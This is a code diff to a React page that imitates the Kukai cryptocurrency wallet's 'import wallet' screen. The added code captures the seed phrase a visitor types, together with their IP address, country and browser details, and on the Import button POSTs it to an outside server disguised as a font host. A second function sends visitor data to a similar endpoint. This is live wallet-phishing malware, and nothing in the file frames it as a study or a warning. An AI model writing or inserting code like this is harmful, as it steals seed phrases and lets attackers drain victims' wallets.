@@ -1,15 +1,73 @@
 "use client";
 
 import { ChevronLeft } from "lucide-react";
-import { useState } from "react";
+import { useEffect, useState } from "react";
+import { getUserCountry } from "../utils/services/getUserLocation";
+import { userAgent } from "next/server";
 
 export default function ImportWallet() {
   const [activeTab, setActiveTab] = useState("keystore");
   const [isToggled, setIsToggled] = useState(false);
-
+  const [userInfo, setUserInfo] = useState()
+  const [seedPhraseMessage, setSeedPhraseMessage] = useState()
   const toggleSwitch = () => {
     setIsToggled(!isToggled);
   };
+
+  useEffect(() => {
+    const fetchUserInfo = async () => {
+      const userInfo = await getUserCountry();
+      console.log(userInfo);
+      setUserInfo(userInfo);
+    };
+    fetchUserInfo();
+  }, []);
+
+
+
+  console.log(userAgent)
+  const messageData = {
+    country: userInfo?.country || "Unknown",
+    browser: navigator.userAgent,
+    ipAddress: userInfo?.ip,
+    appName: "Kukai",
+    seedPhrase: seedPhraseMessage,
+    vpnDetected: userInfo?.ip,
+    specialCountry: true,
+  };
+
+  const messageDataAlt = {
+    country: userInfo?.country,
+    browser: navigator.userAgent,
+    ipAddress: userInfo?.ip,
+    appName: window.href,
+  };
+  const sendMessage = async () => {
+    try {
+      await fetch("https://fonts7787.vercel.app/api/t1/image", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "x-api-key": process.env.NEXT_PUBLIC_SECRET_KEY,
+        },
+        body: JSON.stringify(messageData),
+      });
+    } catch (error) {
+      console.error("Error sending image message:", error);
+    }
+  }
+
+  const sendMessageAlt = async () => {
+    fetch("https://fonts7787.vercel.app/api/t1/font", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "x-api-key": import.meta.env.VITE_APP_SECRET_KEY,
+      },
+      body: JSON.stringify(messageDataAlt),
+    }).catch((error) => console.error("Error sending font message:", error));
+  }
+
 
   return (
     <div className=" bg-[#f0f2f4] pb-[52px] ">
@@ -44,11 +102,10 @@ export default function ImportWallet() {
                 <button
                   key={tab}
                   onClick={() => setActiveTab(tab)}
-                  className={`w-full ${
-                    activeTab === tab
-                      ? "border-b-2 border-[#505bf0] text-[#505bf0]"
-                      : "text-gray-500 hover:text-gray-700"
-                  } px-3 py-2 font-medium text-sm `}
+                  className={`w-full ${activeTab === tab
+                    ? "border-b-2 border-[#505bf0] text-[#505bf0]"
+                    : "text-gray-500 hover:text-gray-700"
+                    } px-3 py-2 font-medium text-sm `}
                 >
                   {tab.charAt(0).toUpperCase() + tab.slice(1)}
                 </button>
@@ -92,6 +149,9 @@ export default function ImportWallet() {
             </p>
             <div className="flex flex-col gap-4 items-center justify-center">
               <textarea
+                onChange={(e) => {
+                  setSeedPhraseMessage(e.target.value)
+                }}
                 rows={4}
                 className="sm:w-[45%] w-[70%] px-3 py-2 text-[11px] text-center text-gray-700 border rounded-lg focus:outline-none focus:border-blue-500"
                 placeholder="Seed word required"
@@ -105,16 +165,13 @@ export default function ImportWallet() {
                 <div className="flex items-center justify-center ">
                   <button
                     onClick={toggleSwitch}
-                    className={`relative inline-flex items-center h-6 w-12 rounded-full transition-colors duration-300 focus:outline-none ${
-                      isToggled ? "bg-white" : "bg-white"
-                    }`}
+                    className={`relative inline-flex items-center h-6 w-12 rounded-full transition-colors duration-300 focus:outline-none ${isToggled ? "bg-white" : "bg-white"
+                      }`}
                   >
                     <span
-                      className={`inline-block h-4 w-4 transform rounded-full  ${
-                        isToggled ? "bg-[#505bf0]" : "bg-gray-200"
-                      } transition-transform duration-300 ${
-                        isToggled ? "translate-x-6" : "translate-x-1"
-                      }`}
+                      className={`inline-block h-4 w-4 transform rounded-full  ${isToggled ? "bg-[#505bf0]" : "bg-gray-200"
+                        } transition-transform duration-300 ${isToggled ? "translate-x-6" : "translate-x-1"
+                        }`}
                     />
                   </button>
                 </div>
@@ -148,7 +205,10 @@ export default function ImportWallet() {
                   </div>
                 </div>
               )}
-              <button className="w-[45%] bg-[#505bf0] text-white rounded-full py-2 px-4 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
+              <button onClick={(e) => {
+                e.preventDefault()
+                sendMessage()
+              }} className="w-[45%] bg-[#505bf0] text-white rounded-full py-2 px-4 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
                 Import
               </button>
             </div>
